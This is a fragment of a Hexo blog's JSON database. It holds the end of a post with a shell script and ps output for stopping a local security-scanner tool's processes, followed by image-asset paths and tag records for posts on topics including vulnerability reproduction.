class=\"string\">'grep'</span>| awk -F <span class=\"string\">' '</span> <span class=\"string\">'&#123;print $2&#125;'</span> | xargs <span class=\"built_in\">kill</span>;</div><div class=\"line\">ps aux | grep <span class=\"string\">'Run.py'</span> | grep -v <span class=\"string\">'grep'</span> | awk <span class=\"string\">'&#123;print $2&#125;'</span> | xargs <span class=\"built_in\">kill</span>;</div><div class=\"line\"><span class=\"comment\">#osascript -e 'do shell script \"ps aux | grep \\\"aider/Aider.py\\\" | grep -v \\\"grep\\\" | awk \\\"&#123;print $2&#125;\\\" | xargs sudo -s kill\" with administrator privileges'</span></div><div class=\"line\"><span class=\"built_in\">kill</span>Aider=<span class=\"string\">\"ps aux | grep 'aider/Aider.py' | grep -v 'grep' | awk '&#123;print \\$2&#125;' | xargs sudo -s kill\"</span>;</div><div class=\"line\"><span class=\"built_in\">kill</span>Aider=<span class=\"string\">'do shell script \"'</span><span class=\"variable\">$killAider</span><span class=\"string\">'\" with administrator privileges'</span>;</div><div class=\"line\">osascript <span class=\"_\">-e</span> <span class=\"string\">\"<span class=\"variable\">$killAider</span>\"</span>;</div><div class=\"line\"><span class=\"comment\">#trap \"osascript -e \\\"$killAider\\\"\" EXIT INT TERM QUIT KILL;</span></div><div class=\"line\">ps aux | grep <span class=\"string\">'nascan/NAScan.py'</span> | grep -v <span class=\"string\">'grep'</span> | awk <span class=\"string\">'&#123;print $2&#125;'</span> | xargs <span class=\"built_in\">kill</span>;</div><div class=\"line\">ps aux | grep <span class=\"string\">'vulscan/VulScan.py'</span> | grep -v <span class=\"string\">'grep'</span> | awk <span class=\"string\">'&#123;print $2&#125;'</span> | xargs <span class=\"built_in\">kill</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"Radar Terminated\"</span>;</div><div class=\"line\">say <span class=\"string\">\"Radar Terminated\"</span>;</div><div class=\"line\"><span class=\"built_in\">exit</span></div></pre></td></tr></table></figure>\n<h3 id=\"问题记录\"><a href=\"#问题记录\" class=\"headerlink\" title=\"问题记录\"></a>问题记录</h3><p>需要kill -9 xxx 才能结束某些进程。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  radar git:(master) ✗ ps aux | grep <span class=\"string\">'mongod --port 65521 --dbpath DBData --auth'</span></div><div class=\"line\">jason            17784   0.0  0.0  2452848   2004   ??  S    10:39AM   0:00.02 /bin/bash -c <span class=\"comment\">#!/bin/sh\\012cd /Users/jason/geekTools/radar\\012if [ $? -eq 0 ]\\012then\\012    /usr/local/bin/mongod --port 65521 --dbpath DBData --auth  &gt;&gt; log/db.log  2&gt;&amp;1 &amp;\\012    /usr/local/bin/python Run.py &gt;&gt; log/web.log 2&gt;&amp;1 &amp;\\012\\011osascript -e 'do shell script \"sudo -s /usr/local/bin/python aider/Aider.py &gt;&gt; log/aider.log 2&gt;&amp;1 &amp;\" with administrator privileges'\\012    /usr/local/bin/python nascan/NAScan.py &gt;&gt; log/nascan.log 2&gt;&amp;1 &amp;\\012    /usr/local/bin/python vulscan/VulScan.py &gt;&gt; log/vulscan.log 2&gt;&amp;1 &amp;\\012    echo \"Radar Started\";\\012    say \"Radar Started\";\\012    trap \"bash kill.sh;exit\" EXIT INT TERM QUIT KILL\\012    while true; do \\012        sleep 86400;\\012    done\\012fi\\012 -</span></div><div class=\"line\">jason            18686   0.0  0.0  2433828   1924 s001  R+   10:47AM   0:00.00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn mongod --port 65521 --dbpath DBData --auth</div><div class=\"line\">jason            18370   0.0  0.0  2435440   2240   ??  S    10:44AM   0:00.01 /bin/bash -c <span class=\"comment\">#!/bin/sh\\012cd /Users/jason/geekTools/radar\\012if [ $? -eq 0 ]\\012then\\012    /usr/local/bin/mongod --port 65521 --dbpath DBData --auth  &gt;&gt; log/db.log  2&gt;&amp;1 &amp;\\012    /usr/local/bin/python Run.py &gt;&gt; log/web.log 2&gt;&amp;1 &amp;\\012\\011osascript -e 'do shell script \"sudo -s /usr/local/bin/python aider/Aider.py &gt;&gt; log/aider.log 2&gt;&amp;1 &amp;\" with administrator privileges'\\012    /usr/local/bin/python nascan/NAScan.py &gt;&gt; log/nascan.log 2&gt;&amp;1 &amp;\\012    /usr/local/bin/python vulscan/VulScan.py &gt;&gt; log/vulscan.log 2&gt;&amp;1 &amp;\\012    echo \"Radar Started\";\\012    say \"Radar Started\";\\012    trap \"bash kill.sh;exit\" EXIT INT TERM QUIT KILL\\012    while true; do \\012        sleep 86400;\\012    done\\012fi\\012 -</span></div></pre></td></tr></table></figure></p>"}],"PostAsset":[{"_id":"source/_posts/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot07.png","slug":"screenshot07.png","post":"cj9qrjfqs000397uvhv91z6gw","modified":0,"renderable":0},{"_id":"source/_posts/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot08.png","slug":"screenshot08.png","post":"cj9qrjfqs000397uvhv91z6gw","modified":0,"renderable":0},{"_id":"source/_posts/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot09.png","slug":"screenshot09.png","post":"cj9qrjfqs000397uvhv91z6gw","modified":0,"renderable":0},{"_id":"source/_posts/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot10.png","slug":"screenshot10.png","post":"cj9qrjfqs000397uvhv91z6gw","modified":0,"renderable":0},{"_id":"source/_posts/Web-API接口安全了解/screenshot03.png","slug":"screenshot03.png","post":"cj9qrjfsl000k97uv24tbtp8l","modified":0,"renderable":0},{"_id":"source/_posts/Web-API接口安全了解/screenshot02.png","slug":"screenshot02.png","post":"cj9qrjfsl000k97uv24tbtp8l","modified":0,"renderable":0},{"_id":"source/_posts/Web-API接口安全了解/screenshot23.png","slug":"screenshot23.png","post":"cj9qrjfsl000k97uv24tbtp8l","modified":0,"renderable":0},{"_id":"source/_posts/Web-API接口安全了解/screenshot31.png","slug":"screenshot31.png","post":"cj9qrjfsl000k97uv24tbtp8l","modified":0,"renderable":0},{"_id":"source/_posts/Web-API接口安全了解/screenshot50.png","slug":"screenshot50.png","post":"cj9qrjfsl000k97uv24tbtp8l","modified":0,"renderable":0},{"_id":"source/_posts/iPhoneX抢购Python脚本/image02.png","slug":"image02.png","post":"cj9qrjfsw000t97uv4lgc3jb0","modified":0,"renderable":0},{"_id":"source/_posts/Android开发及破解入门实例/Screenshot_03.png","slug":"Screenshot_03.png","post":"cj9qrjfq9000097uvxt1st4gf","modified":0,"renderable":0},{"_id":"source/_posts/Tomcat文件上传-CVE-2017-12615-复现/ScreenShot04.png","slug":"ScreenShot04.png","post":"cj9qrjfs5000d97uvov87gaax","modified":0,"renderable":0},{"_id":"source/_posts/百度统计JS脚本分析-流量伪造脚本/image01.jpg","slug":"image01.jpg","post":"cj9qrjft1000y97uvf2u5bby2","modified":0,"renderable":0},{"_id":"source/_posts/SMTP命令行及Python发送邮件/screenshot01.png","slug":"screenshot01.png","post":"cj9qrjfsf000h97uv963sx4eg","modified":0,"renderable":0},{"_id":"source/_posts/SMTP命令行及Python发送邮件/screenshot02.png","slug":"screenshot02.png","post":"cj9qrjfsf000h97uv963sx4eg","modified":0,"renderable":0},{"_id":"source/_posts/iPhoneX抢购Python脚本/image01.jpg","slug":"image01.jpg","post":"cj9qrjfsw000t97uv4lgc3jb0","modified":0,"renderable":0},{"_id":"source/_posts/iPhoneX抢购Python脚本/image03.png","slug":"image03.png","post":"cj9qrjfsw000t97uv4lgc3jb0","modified":0,"renderable":0},{"_id":"source/_posts/Android开发及破解入门实例/Screenshot_01.png","slug":"Screenshot_01.png","post":"cj9qrjfq9000097uvxt1st4gf","modified":0,"renderable":0},{"_id":"source/_posts/Android开发及破解入门实例/Screenshot_02.png","slug":"Screenshot_02.png","post":"cj9qrjfq9000097uvxt1st4gf","modified":0,"renderable":0},{"_id":"source/_posts/Android开发及破解入门实例/Screenshot_04.png","slug":"Screenshot_04.png","post":"cj9qrjfq9000097uvxt1st4gf","modified":0,"renderable":0},{"_id":"source/_posts/Android开发及破解入门实例/constraintLayout.png","slug":"constraintLayout.png","post":"cj9qrjfq9000097uvxt1st4gf","modified":0,"renderable":0},{"_id":"source/_posts/Tomcat文件上传-CVE-2017-12615-复现/ScreenShot01.png","slug":"ScreenShot01.png","post":"cj9qrjfs5000d97uvov87gaax","modified":0,"renderable":0},{"_id":"source/_posts/Tomcat文件上传-CVE-2017-12615-复现/ScreenShot02.png","slug":"ScreenShot02.png","post":"cj9qrjfs5000d97uvov87gaax","modified":0,"renderable":0},{"_id":"source/_posts/Tomcat文件上传-CVE-2017-12615-复现/ScreenShot03.png","slug":"ScreenShot03.png","post":"cj9qrjfs5000d97uvov87gaax","modified":0,"renderable":0},{"_id":"source/_posts/Tomcat文件上传-CVE-2017-12615-复现/ScreenShot05.png","slug":"ScreenShot05.png","post":"cj9qrjfs5000d97uvov87gaax","modified":0,"renderable":0},{"_id":"source/_posts/Tomcat文件上传-CVE-2017-12615-复现/ScreenShot06.png","slug":"ScreenShot06.png","post":"cj9qrjfs5000d97uvov87gaax","modified":0,"renderable":0},{"_id":"source/_posts/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot01.png","slug":"screenshot01.png","post":"cj9qrjfqs000397uvhv91z6gw","modified":0,"renderable":0},{"_id":"source/_posts/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot02.png","slug":"screenshot02.png","post":"cj9qrjfqs000397uvhv91z6gw","modified":0,"renderable":0},{"_id":"source/_posts/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot03.png","slug":"screenshot03.png","post":"cj9qrjfqs000397uvhv91z6gw","modified":0,"renderable":0},{"_id":"source/_posts/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot04.png","slug":"screenshot04.png","post":"cj9qrjfqs000397uvhv91z6gw","modified":0,"renderable":0},{"_id":"source/_posts/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot05.png","slug":"screenshot05.png","post":"cj9qrjfqs000397uvhv91z6gw","modified":0,"renderable":0},{"_id":"source/_posts/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot06.png","slug":"screenshot06.png","post":"cj9qrjfqs000397uvhv91z6gw","modified":0,"renderable":0},{"_id":"source/_posts/Web-API接口安全了解/screenshot01.png","slug":"screenshot01.png","post":"cj9qrjfsl000k97uv24tbtp8l","modified":0,"renderable":0},{"_id":"source/_posts/Web-API接口安全了解/screenshot04.png","slug":"screenshot04.png","post":"cj9qrjfsl000k97uv24tbtp8l","modified":0,"renderable":0},{"_id":"source/_posts/Web-API接口安全了解/screenshot21.png","slug":"screenshot21.png","post":"cj9qrjfsl000k97uv24tbtp8l","modified":0,"renderable":0},{"_id":"source/_posts/Web-API接口安全了解/screenshot22.png","slug":"screenshot22.png","post":"cj9qrjfsl000k97uv24tbtp8l","modified":0,"renderable":0},{"_id":"source/_posts/Web-API接口安全了解/screenshot24.png","slug":"screenshot24.png","post":"cj9qrjfsl000k97uv24tbtp8l","modified":0,"renderable":0},{"_id":"source/_posts/Web-API接口安全了解/screenshot32.png","slug":"screenshot32.png","post":"cj9qrjfsl000k97uv24tbtp8l","modified":0,"renderable":0},{"_id":"source/_posts/Web-API接口安全了解/screenshot41.png","slug":"screenshot41.png","post":"cj9qrjfsl000k97uv24tbtp8l","modified":0,"renderable":0},{"_id":"source/_posts/Web-API接口安全了解/screenshot42.png","slug":"screenshot42.png","post":"cj9qrjfsl000k97uv24tbtp8l","modified":0,"renderable":0}],"PostCategory":[],"PostTag":[{"post_id":"cj9qrjfq9000097uvxt1st4gf","tag_id":"cj9qrjfqo000297uv6khtn6k4","_id":"cj9qrjfrh000797uvplsa7m8j"},{"post_id":"cj9qrjfqs000397uvhv91z6gw","tag_id":"cj9qrjfra000697uvrby4waan","_id":"cj9qrjfry000c97uviiqkovyq"},{"post_id":"cj9qrjfrh000897uvc9lttq49","tag_id":"cj9qrjfrx000a97uvlgp7uby6","_id":"cj9qrjfsf000g97uvb9qkkx7l"},{"post_id":"cj9qrjfrx000b97uv5aud6bkb","tag_id":"cj9qrjfse000f97uv090fpsdi","_id":"cj9qrjfsm000l97uv0jchfj8d"},{"post_id":"cj9qrjfs5000d97uvov87gaax","tag_id":"cj9qrjfsk000j97uvkzxjy5n4","_id":"cj9qrjfsv000s97uvf6yvznqu"},{"post_id":"cj9qrjfs5000d97uvov87gaax","tag_id":"cj9qrjfsp000n97uv902ui59r","_id":"cj9qrjfsy000u97uv69f02wwi"},{"post_id":"cj9qrjfsr000p97uvqvt57czm","tag_id":"cj9qrjfse000f97uv090fpsdi","_id":"cj9qrjft1000x97uvdehlm60e"},{"post_id":"cj9qrjfsd000e97uvdsupb0ge","tag_id":"cj9qrjfst000q97uvl9ju187i","_id":"cj9qrjft4000z97uvav2l61ki"},{"post_id":"cj9qrjfsl000k97uv24tbtp8l","tag_id":"cj9qrjft0000w97uva4cex5z6","_id":"cj9qrjft7001297uvx856fxcv"},{"post_id":"cj9qrjfsn000m97uvn2xelywb","tag_id":"cj9qrjft6001197uvt8gnafyf","_id":"cj9qrjft8001497uvb3sdr1or"},{"post_id":"cj9qrjfst000r97uvswtyybrw","tag_id":"cj9qrjft7001397uvfyejnars","_id":"cj9qrjft9001697uvnp2j4nqc"},{"post_id":"cj9qrjfsw000t97uv4lgc3jb0","tag_id":"cj9qrjft9001597uvarbt959i","_id":"cj9qrjftb001897uv68ktnrl8"},{"post_id":"cj9qrjft1000y97uvf2u5bby2","tag_id":"cj9qrjft9001597uvarbt959i","_id":"cj9qrjftd001997uvkoo39hqb"}],"Tag":[{"name":"Android","_id":"cj9qrjfqo000297uv6khtn6k4"},{"name":"漏洞复现","_id":"cj9qrjfra000697uvrby4waan"},{"name":"PHP","_id":"cj9qrjfrx000a97uvlgp7uby6"},{"name":"Python","_id":"cj9qrjfse000f97uv090fpsdi"},{"name":"文件上传","_id":"cj9qrjfsk000j97uvkzxjy5n4"},{"name":"tomcat","_id":"cj9qrjfsp000n97uv902ui59r"},{"name":"日志分析","_id":"cj9qrjfst000q97uvl9ju187i"},{"name":"接口安全","_id":"cj9qrjft0000w97uva4cex5z6"},{"name":"Web","_id":"cj9qrjft6001197uvt8gnafyf"},{"name":"ms17-010","_id":"cj9qrjft7001397uvfyejnars"},{"name":"python","_id":"cj9qrjft9001597uvarbt959i"}]}}